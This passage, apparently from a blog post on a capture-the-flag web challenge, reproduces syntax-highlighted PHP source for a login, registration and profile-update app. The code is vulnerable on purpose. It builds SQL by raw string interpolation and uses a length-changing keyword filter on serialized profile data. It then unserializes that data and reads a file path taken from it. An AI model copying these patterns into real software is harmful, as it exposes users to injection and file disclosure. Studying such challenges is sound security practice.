sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line"><span class="keyword">return</span> mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key_list</span>, <span class="variable">$value_list</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$key</span> = implode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$key_list</span>);</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&#x27;\&#x27;&#x27;</span> . implode(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="variable">$value_list</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line"><span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> user();</span><br><span class="line"><span class="variable">$user</span>-&gt;connect(<span class="variable">$config</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">class</span>=&quot;<span class="title">well</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>:220<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt; </span></span><br><span class="line"><span class="class">&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">piapiapia</span>.<span class="title">gif</span>&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h3</span>&gt;<span class="title">Login</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span>&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span>&gt;<span class="title">Password</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">span3</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">LOGIN</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#register.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$user</span>-&gt;is_exists(<span class="variable">$username</span>)) &#123;</span><br><span class="line"><span class="variable">$user</span>-&gt;register(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;User name Already Exists&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">register</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">class</span>=&quot;<span class="title">well</span>&quot; <span class="title">style</span>=&quot;<span class="title">width</span>:220<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt; </span></span><br><span class="line"><span class="class">&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">static</span>/<span class="title">piapiapia</span>.<span class="title">gif</span>&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h3</span>&gt;<span class="title">Register</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span>&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot;<span class="title">class</span>=&quot;<span class="title">span3</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span>&gt;<span class="title">Password</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>:30<span class="title">px</span>&quot; <span class="title">class</span>=&quot;<span class="title">span3</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">REGISTER</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#profile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">top</span>:100<span class="title">px</span>&quot;&gt;  </span></span><br><span class="line"><span class="class">&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">data</span>:<span class="title">image</span>/<span class="title">gif</span>;<span class="title">base64</span>,&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">photo</span>; ?&gt;&quot; <span class="title">class</span>=&quot;<span class="title">img</span>-<span class="title">memeda</span> &quot; <span class="title">style</span>=&quot;<span class="title">width</span>:180<span class="title">px</span>;<span class="title">margin</span>:0<span class="title">px</span> <span class="title">auto</span>;&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h3</span>&gt;<span class="title">Hi</span> &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">nickname</span>;?&gt;&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span>&gt;<span class="title">Phone</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">phone</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">label</span>&gt;<span class="title">Email</span>: &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">email</span>;?&gt;&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#update.php</span><br><span class="line">&lt;?php</span><br><span class="line">require_once(&#x27;class.php&#x27;);</span><br><span class="line">if($_SESSION[&#x27;username&#x27;] == null) &#123;</span><br><span class="line">die(&#x27;Login First&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123;</span><br><span class="line"></span><br><span class="line">$username = $_SESSION[&#x27;username&#x27;];</span><br><span class="line">if(!preg_match(&#x27;/^\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;]))</span><br><span class="line">die(&#x27;Invalid phone&#x27;);</span><br><span class="line"></span><br><span class="line">if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;]))</span><br><span class="line">die(&#x27;Invalid email&#x27;);</span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10)</span><br><span class="line">die(&#x27;Invalid nickname&#x27;);</span><br><span class="line"></span><br><span class="line">$file = $_FILES[&#x27;photo&#x27;];</span><br><span class="line">if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000)</span><br><span class="line">die(&#x27;Photo size error&#x27;);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]));</span><br><span class="line">$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];</span><br><span class="line">$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];</span><br><span class="line">$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];</span><br><span class="line">$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class="line">&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Email:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line">&lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$config</span>[<span 